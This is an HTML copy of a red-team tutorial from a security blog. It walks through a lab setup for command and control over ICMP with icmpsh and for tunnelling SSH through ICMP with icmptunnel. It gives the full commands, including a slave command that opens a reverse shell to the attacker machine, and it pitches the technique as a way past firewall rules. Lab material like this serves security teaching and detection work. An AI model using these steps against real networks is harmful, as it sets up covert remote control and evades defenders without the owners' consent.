@@ -1,0 +1,136 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/" rel="category tag">Command and Control</a>, <a href="https://www.hackingarticles.in/category/tunneling-pivoting/" rel="category tag">Tunneling &amp; Pivoting</a></span>            </div>
+            <h1 class="post-title entry-title">Command and Control &amp; Tunnelling via ICMP</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/command-and-control-tunnelling-via-icmp/" rel="bookmark"><time class="entry-date published" datetime="2019-07-28T10:10:26+00:00">July 28, 2019</time><time class="updated" datetime="2025-05-12T17:38:14+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, you will learn about the RED TEAM Operation for data exfiltration via ICMP-C2 and ICMP Tunneling because both approaches are useful in order to circumvent firewall rules because they generate unsound traffic in the network.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Brief Summary on the Working of the ICMP Protocol</strong></span></p>
+<p><span style="color: #000000;"><strong>Command &amp; Control via ICMP Protocol</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Requirement</span></li>
+<li><span style="color: #000000;">icmpsh: C2-channel &amp; Its Installation</span></li>
+<li><span style="color: #000000;">Run icmpsh as Master</span></li>
+<li><span style="color: #000000;">Run icmpsh as Slave</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>ICMP Tunneling</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Requirement</span></li>
+<li><span style="color: #000000;">Configure ICMP over Server Machine (Target)</span></li>
+<li><span style="color: #000000;">Configure ICMP tunnel over Client Machine (Intruder)</span></li>
+<li><span style="color: #000000;">Connect SSH Over ICMP</span></li>
+</ul>
+<h3><span style="color: #800000;">Brief Summary on the Working of the ICMP Protocol</span></h3>
+<p><span style="color: #000000;"> The Internet Control Message Protocol (ICMP) is a supporting protocol in the Internet Protocol Suite. It is used by network devices, including routers, to send error messages and operational information that indicates that a requested service is not available or that a host or router could not be reached.</span></p>
+<p><span style="color: #000000;">It is layer 3 i.e. network layer protocol used by the ping command for sending a message through an ICMP payload, which is encapsulated with an IP Header Packet.  According to MTU, the size of the ICMP packet cannot be greater than 1500 bytes.</span></p>
+<h4><span style="color: #000000;">ICMP packet at Network layer</span></h4>
+<table width="0">
+<tbody>
+<tr>
+<td width="78"><span style="color: #000000;"><strong>IP header</strong></span></td>
+<td width="96"><span style="color: #000000;"><strong>ICMP header</strong></span></td>
+<td width="162"><span style="color: #000000;"><strong>ICMP payload size</strong></span></td>
+<td width="150"><span style="color: #000000;"><strong>  MTU (1500)</strong></span></td>
+</tr>
+<tr>
+<td width="78"><span style="color: #000000;">20 bytes</span></td>
+<td width="96"><span style="color: #000000;">8 bytes</span></td>
+<td width="162"><span style="color: #000000;">1472 bytes  (maximum)</span></td>
+<td width="150"><span style="color: #000000;">20 + 8 + 1472 = 1500</span></td>
+</tr>
+</tbody>
+</table>
+<p><span style="color: #000000;">A ping command sends an ICMP echo request to the target host. The target host responds with an echo Reply, which means the target host is alive.</span></p>
+<p><span style="color: #000000;"><strong>Read more from <a style="color: #000000;" href="https://www.hackingarticles.in/understanding-guide-icmp-protocol-wireshark/">here</a></strong></span></p>
+<h3><span style="color: #800000;">Command &amp; Control via ICMP Protocol</span></h3>
+<p><span style="color: #000000;">In our many publications, we have discussed over C2-channel which is additionally acknowledged as command &amp; control so you may find out it<strong> <a style="color: #000000;" href="https://www.hackingarticles.in/red-teaming/">here</a></strong>. Although you are pleased to learn how to use ICMP protocol as a command &amp; control channel between this thesis.</span></p>
+<p><span style="color: #000000;">A cyber-war is a scenario of an Intruder and a Security researcher, therefore, we need to hold a partial backup plan. As we all know, the company has grown to be smarter; they understand that such a type concerning attack is being observed after achieving TCP reverse connection of the machine.</span></p>
+<p><span style="color: #000000;">Thus we come up with ICMP secret shell which and use icmpsh as a command &amp; control tool.</span></p>
+<h4><span style="color: #000000;">REQUIREMENT</span></h4>
+<ul>
+<li><span style="color: #000000;">Attacker Machine or C2-channel: 192.168.1.108 (Kali Linux)</span></li>
+<li><span style="color: #000000;">Host machine: 192.168.1.106 (Windows 10)</span></li>
+</ul>
+<h4><span style="color: #000000;">icmpsh: C2-channel &amp; Its Installation </span></h4>
+<p><span style="color: #000000;"><strong>icmpsh</strong> is a simple reverse ICMP shell with a Win32 slave and a POSIX-compatible master in C, Perl, or Python. The main advantage over the other similar open-source tools is that it does not require administrative privileges to run onto the target machine.</span></p>
+<p><span style="color: #000000;">The tool is clean, easy and portable. The slave (client) runs on the target Windows machine, it is written in C and works on Windows only whereas the master (server) can run on any platform on the attacker machine as it has been implemented in C and Perl by Nico Leidecker and later it also gets ported into Python too.</span></p>
+<p><span style="color: #000000;">It is very easy to install and use as c2-channel. Turn the attacker machine for icmpsh and download icmpsh from Github.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/inquisb/icmpsh.git</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RV787f5w6t4/XT1xoJ8mGXI/AAAAAAAAfnA/AZ7Dtc3oBBsgC-18l4Fh6TkYCO3aHJz9wCLcBGAs/s1600/1.png"/></span></p>
+<h4><span style="color: #000000;">Run icmpsh as Master (Kali Linux)</span></h4>
+<p><span style="color: #000000;">Once you complete the downloads, you can use the following command to run the master. The most important step before taking action is to disable ping reply on your machine. This prevents the kernel from responding to ping packets itself.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysctl -w net.ipv4.icmp_echo_ignore_all=1
+cd icmpsh
+syntax: ./icmpsh_m.py &lt;attacker’s-IP&gt; &lt;target-IP&gt;
+./icmpsh_m.py 192.168.1.108 192.168.1.106</pre>
+<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-YPe8fsZDUQw/XT1xpWuxoII/AAAAAAAAfnU/o3sgN0yliC0YY0h_Yea6onLb-aZEUlyEACLcBGAs/s1600/2.png"/></p>
+<h4><span style="color: #000000;">Run icmpsh as slave (Windows 10)</span></h4>
+<p><span style="color: #000000;">Now again install icmpsh tool inside the host machine for running as slave and the user running the slave on the target system does not require administrative privileges.</span></p>
+<p><span style="color: #000000;">And then run the following command :</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">syntax: icmpsh.exe -t &lt;Kali IP&gt;
+icmpsh.exe -t 192.168.1.108</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-xupIgD0Me38/XT1xrMkoCfI/AAAAAAAAfno/E6Ln9mUJlPQtQR83FPl1hzuwz5w3y5lawCLcBGAs/s1600/3.png" alt="Command and Control via ICMP Tunneling" width="472" height="128"/></span></p>
+<p><span style="color: #000000;">Once the above command is executed on the host machine, the intrude will have reverse shell of the machine running as a slave’s . You can observe from the image given below that the machine controls the slave machine by spawning its prompt of command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SY4cgTddQH8/XT1xq0VB05I/AAAAAAAAfnk/w8DjRwEfhzUD-r6t-jg0RivIU3B2HNujwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Now as we said that with the help ping, icmpsh will get the host machine’s reverse shell over the icmp channel. Therefore, I simply trigger a command and use Wireshark to capture its packet to ensure the backend process.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_05Bzk58YOM/XT1xrQMgKLI/AAAAAAAAfns/Z_EPNUL567YWY2F18VffRw3iUuK1H2towCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Great!! This works exactly as we assumed and PING request/reply packets transmit the data over the network layer, thus no service or port is required. Proxy-based firewalls undetect the traffic, and this may bypass firewall rules.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/--mhwbaoKlNU/XT1xrw0AXXI/AAAAAAAAfnw/_5dU1uoAea4rEvEEP5SkSfT-jHr_qfx1gCLcBGAs/s1600/8.png" alt="Command and Control via ICMP Tunneling" width="946" height="668"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">ICMP Tunneling</span> </span></h3>
+<p><span style="color: #000000;">ICMP tunnel is an approach that works by tunneling TCP connections over ICMP packets. Here we will access the SSH session encapsulating it with ICMP packets. Hence, we will again establish a TCP connection at layer 3, i.e., the network layer, encapsulating it as ICMP payload, which could help us bypass firewall rules.</span></p>
+<h4><span style="color: #000000;">REQUIREMENT</span></h4>
+<p><span style="color: #000000;"><strong> </strong><strong>Server Machine</strong></span></p>
+<ul>
+<li><span style="color: #000000;">ens33:192.168.1.108</span></li>
+<li><span style="color: #000000;">tun0:10.0.0.1</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Client Machine</strong></span></p>
+<ul>
+<li><span style="color: #000000;">eth0: 192.168.1.111</span></li>
+<li><span style="color: #000000;">tun0:10.0.0.2</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>icmptunnel</strong> is a tool to tunnel IP traffic within ICMP echo request and response (ping) packets. It aims to bypass firewalls in a semi-covert way, for example, when users pivot inside a network where ping is allowed. It might also prove useful for egress from a corporate network to the Internet, although network administrators commonly filter ICMP echo traffic at the network perimeter.</span></p>
+<p><span style="color: #000000;">While there are a couple of existing tools which implement this technique, icmptunnel provides a more reliable protocol and a mechanism for tunneling through stateful firewalls and NAT.</span></p>
+<h4><span style="color: #000000;">Configure ICMP over Server Machine (Target)</span></h4>
+<p><span style="color: #000000;">Download and install icmptunnel on the host machine and compile the file as followed in the image given below</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jamesbarlow/icmptunnel.git
+cd icmptunnel
+make</pre>
+<p><strong style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-QgZ8ZpF_snE/XT1xoUpRYOI/AAAAAAAAfnE/Ewo5p-13HtkLUkgAGFch_kAcvmghhxxvACLcBGAs/s1600/15.png" alt="Command and Control via ICMP Tunneling" width="678" height="202"/></strong></p>
+<p><span style="color: #000000;">First, disable ICMP echo reply on both the client and server. This foils the kernel from responding to ping packets itself.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</pre>
+<p><span style="color: #000000;">On the server-side (host machine), start icmptunnel in server mode, and assign an IP address to the new tunnel interface.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./icmptunnel -s
+Ctrlz
+bg
+/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0
+ifconfig</pre>
+<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-dOktWE1HuwA/XT1xoQNub_I/AAAAAAAAfnI/CxusMH4Z0YYOluMs_T0GhHpL5VBjbl63gCLcBGAs/s1600/16.png"/></p>
+<h4><span style="color: #000000;">Configure ICMP tunnel over Client Machine (Intruder)</span></h4>
+<p><span style="color: #000000;">Similarly, repeat the same process over the intruder machine to install icmptunnel for peer to peer connection.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jamesbarlow/icmptunnel.git</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-cX06-4TTZik/XT1xo27bOMI/AAAAAAAAfnQ/F85a4babwOgXkPTHDz3LxqOMRBiiAjuxQCLcBGAs/s1600/18.png" alt="Command and Control via ICMP Tunneling" width="634" height="97"/></span></p>
+<p><span style="color: #000000;">First, compile it and then disable ICMP echo reply to avoid kernel from responding to ping packets itself.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd icmptunnel
+make
+echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all
+./icmptunnel 192.168.1.108
+ctrl z
+/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0</pre>
+<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-aIIoCG9bs5s/XT1xo8vRuRI/AAAAAAAAfnM/cH0_oUUr3pMHcZwqiA_uDksE3XKkP1L7gCLcBGAs/s1600/19.png"/></p>
+<h4><span style="color: #800000;"><span style="color: #000000;">Connect SSH Over ICMP</span> </span></h4>
+<p><span style="color: #000000;">You should have a point-to-point tunnel at this point through ICMP packets. There is 10.0.0.1 on the server-side and 10.0.0.2 on the client-side. Try to connect to the server via SSH a tcp protocol on the client:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh raj@10.0.0.1</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-EiV-mS5yJ7I/XT1xqO6MwiI/AAAAAAAAfnY/QY8U-SsGWFomdaLHkjqFKtfdkd0fhzp2QCLcBGAs/s1600/20.png" alt="Command and Control via ICMP Tunneling" width="686" height="420"/></span></p>
+<p><span style="color: #000000;">We connect the ICMP tunnel between the server and client at the initial phase, which you can see in the following image where we captured the traffic flowing between the server and client with the help of Wireshark.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TD4U2k6MPEU/XT1xqAxGJDI/AAAAAAAAfnc/nyYkbEbOWd4TfpGZAqZwDmm73VCYYeV5QCLcBGAs/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">Every traffic is ICMP. The network regards the packet HTTP / IP as part of the ICMP payload. The system accelerates the HTTP/IP packets to the internet. Notice how the NAT impersonates the source IP. Thus, the traffic will not go on the transport layer for connecting SSH via port 22.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-ILEpvZw0mcE/XT1xqsr76qI/AAAAAAAAfng/W3F15588O0IBuVK2kJQnIP5oOBOl4CuggCLcBGAs/s1600/22.png" alt="Command and Control via ICMP Tunneling" width="966" height="381"/></span></p>
+<p><span style="color: #000000;">To learn more about <strong>Command and Control</strong>. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/">Link.</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
